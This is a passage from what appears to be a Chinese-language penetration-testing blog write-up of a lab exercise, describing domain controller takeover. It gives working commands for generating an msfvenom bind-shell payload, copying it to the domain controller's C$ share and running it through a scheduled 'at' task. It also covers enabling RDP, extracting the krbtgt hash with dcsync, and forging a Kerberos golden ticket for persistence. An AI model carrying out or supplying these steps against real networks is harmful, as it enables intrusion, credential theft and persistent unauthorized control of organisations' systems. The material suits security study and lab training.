alt="在这里插入图片描述"><br>导入成功，这时我们 dir  \dc\c$看一下能不能查看域控的c盘<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_16,color_FFFFFF,t_70,g_se,x_16-168241555514365-168241665698226.png" alt="在这里插入图片描述"><br>nice，成功了，接下来我们就可以操控域控了，思路是上传文件给域控，然后写定时任务，反弹shell。</p><p>接下来生成一个msf正向木马</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp lport&#x3D;17777 -f exe &gt;bind.exe</p><p>直接上传到dmz机器，也就是我们这个机器，然后通过刚刚mimikatz导入的票据，访问dc，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">进入meterpreter的shell，</span><br><span class="line">&gt; copy <span class="built_in">bind</span> \\dc\c$\</span><br><span class="line">&gt; <span class="built_in">dir</span> \\dc\c$   <span class="comment">#看一下有没有上传成功</span></span><br><span class="line">&gt; net time \\dc <span class="comment">#看一下时间，然后准备写入计划任务</span></span><br><span class="line">&gt; at \\dc 10:05:00 c:/bind.exe</span><br><span class="line">&gt; at \\dc <span class="comment">#看一下有没有写入成功</span></span><br></pre></td></tr></table></figure><p>等一会，我们直接用msf连接，好了，连接成功。</p><p>这时我们已经获取到域控了，看一下权限，是system，直接迁移进入导入mimikatz，抓取密码，<br>获取密码，就可以制作黄金票据，一般用于权限维持，也可以开3389远程登录，不过动静应该挺大的<br>这里还是给出过程吧。“ run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp ”。<br>kali 直接执行proxychains rdesktop 10.10.10.149 就可以了。</p><p><strong>制作黄金票据</strong><br>考虑长期权维护，还是做一个黄金票据比较保险，先清理一下刚刚生成的票据。</p><p>此时会话是“ web ”服务器的，并不是域控的。要注意！！！</p><p>先加载kiwi，然后使用“ kerberos_ticket_purge ”来清理票据。</p><p>此时，应该开始制作票据了，开始准备一些制作票据的资料（ntml sid），先切换回域控会话。</p><p>第一种获取“ SID ”的方法，先进入shell环境，</p><p>执行“ wmic useraccount where name&#x3D;”krbtgt” get sid ”命令。</p><p><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/6ab9e5e4af814f4fa367a181ec9c5891-168241556148970-168241665698227.png" alt="在这里插入图片描述"><br>这种方式是有缺陷的，即不能获取“ ntml ”。</p><p>我们接着来说第二种方法，需要“ 域管理员权限 ”，使用ps查看进程。<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168241556413272-168241665698228.png" alt="在这里插入图片描述"></p><p>切换到任意一个进程，注意使用“ steal_token ”命令而非“ migrate ”。</p><p>使用“ dcsync_ntlm krbtgt ”命令来获取krbtgt 的资料，需要先load kiwi<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/7ee0df391121451093f79f1aa2407594-168241665698229.png" alt="在这里插入图片描述"><br>生成黄金票据的公式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d 域名 -u 任意用户名 -s SID(没有-502) -k NTLM -t　保存位置。</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d hackbox.com -u asdzxc -s S-1-5-21-2005268815-658469957-1189185684 -k 6f60ace6accbcb76078ccc0312174e98 -t /tmp/krbtgt.ticket</span><br></pre></td></tr></table></figure><p>刚刚我们使用域控会话成功制作了黄金票据，此时我们切换到web服务器会话。</p><p>将生成的黄金票据，先验证一下，此时能不能访问域控的c盘。显然不能，回到meterpreter，<br>直接清空票据并且导入。<br><img src="/2022/04/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/f224cf0f55ed4f7bbfe018dba9fe7dbb-168241665698230.png" alt="在这里插入图片描述"></p><p>注入成功，进入shell成功访问到域控。并且是域控会话。</p><p>cs渗透的我等会再写吧…..</p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> Domain </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
